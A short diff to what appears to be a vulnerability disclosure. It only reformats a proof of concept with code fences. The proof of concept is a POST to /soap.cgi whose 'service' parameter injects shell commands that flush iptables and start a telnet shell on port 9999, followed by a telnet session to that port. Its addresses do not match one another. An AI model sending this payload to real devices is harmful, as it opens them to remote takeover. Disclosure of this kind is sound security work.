@@ -107,7 +107,7 @@ if(fn)
 }
 ```
 Proof of concept:
-=====================================
+```
 POST /soap.cgi?service=whatever-control;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;iptables -t nat -P PREROUTING ACCEPT;iptables -t nat -P OUTPUT ACCEPT;iptables -t nat -P POSTROUTING ACCEPT;telnetd -p 9999;whatever-invalid-shell HTTP/1.1
 Host: 192.168.100.1:49152
 Accept-Encoding: identity
@@ -122,4 +122,4 @@ $ telnet 9.9.9.9 9999
 Trying 9.9.9.9...
 Connected to 192.168.0.1.
 Escape character is '^]'.
-
+```
